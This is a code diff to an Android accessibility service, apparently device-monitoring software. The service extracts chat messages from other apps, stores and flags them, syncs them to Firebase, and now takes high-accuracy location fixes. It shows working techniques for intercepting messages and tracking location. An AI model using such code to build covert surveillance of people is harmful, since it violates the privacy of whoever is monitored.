@@ -8,10 +8,13 @@ import android.content.IntentFilter
 import android.content.SharedPreferences
 import android.location.LocationManager
 import android.net.ConnectivityManager
+import android.net.NetworkCapabilities
 import android.os.BatteryManager
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import com.device.guardian.service.data.local.AppDatabase
+import com.google.android.gms.location.LocationServices
+import com.google.android.gms.location.Priority
 import com.device.guardian.service.data.local.MessageEntity
 import com.device.guardian.service.data.remote.FirebaseRepository
 import com.device.guardian.service.service.extractor.MessageExtractor
@@ -83,6 +86,8 @@ class GuardianAccessibilityService : AccessibilityService() {
         } catch (e: Exception) {
             Log.w(TAG, "Extraction error: ${e.message}")
             emptyList()
+        } finally {
+            root.recycle()
         }
 
         if (extracted.isEmpty()) return
@@ -100,9 +105,10 @@ class GuardianAccessibilityService : AccessibilityService() {
     private suspend fun processMessage(raw: MessageExtractor.RawMessage, timestamp: Long) {
         // Step 1 — in-memory dedup
         val cacheKey = "${raw.chatName}::${raw.content}::${raw.sender}"
-        if (dedupCache.contains(cacheKey)) return
-        if (dedupCache.size >= DEDUP_MAX) dedupCache.remove(dedupCache.iterator().next())
-        dedupCache.add(cacheKey)
+        synchronized(dedupCache) {
+            if (!dedupCache.add(cacheKey)) return
+            if (dedupCache.size >= DEDUP_MAX) dedupCache.remove(dedupCache.iterator().next())
+        }
 
         // Step 2 — DB-level dedup (10 minute window)
         val since = timestamp - DEDUP_WINDOW_MS
@@ -123,12 +129,8 @@ class GuardianAccessibilityService : AccessibilityService() {
             isOutgoing = raw.isOutgoing,
             isFlagged = filter.isFlagged,
             flagReason = filter.reason,
-            isSynced = false
         )
         db.messageDao().insert(entity)
-
-        // Step 5 — attempt immediate sync
-        firebaseRepo.syncPending()
     }
 
     // Periodic sync — catches anything that failed immediate sync
@@ -170,19 +172,20 @@ class GuardianAccessibilityService : AccessibilityService() {
 
         // 2. Connectivity
         val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
-        val activeNetwork = cm.activeNetworkInfo
-        val isOnline = activeNetwork?.isConnected == true
+        val network = cm.activeNetwork
+        val caps = network?.let { cm.getNetworkCapabilities(it) }
+        val isOnline = caps?.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) == true
 
-        // 3. Location coordinates
+        // 3. Location coordinates (High Accuracy via Play Services)
         var lat: Double? = null
         var lon: Double? = null
         try {
-            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
-            if (checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
-                val gpsLoc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
-                val netLoc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
-                val bestLoc = gpsLoc ?: netLoc
-                bestLoc?.let {
+            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                val fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
+                val location = kotlinx.coroutines.tasks.await(
+                    fusedLocationClient.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, null)
+                )
+                location?.let {
                     lat = it.latitude
                     lon = it.longitude
                 }
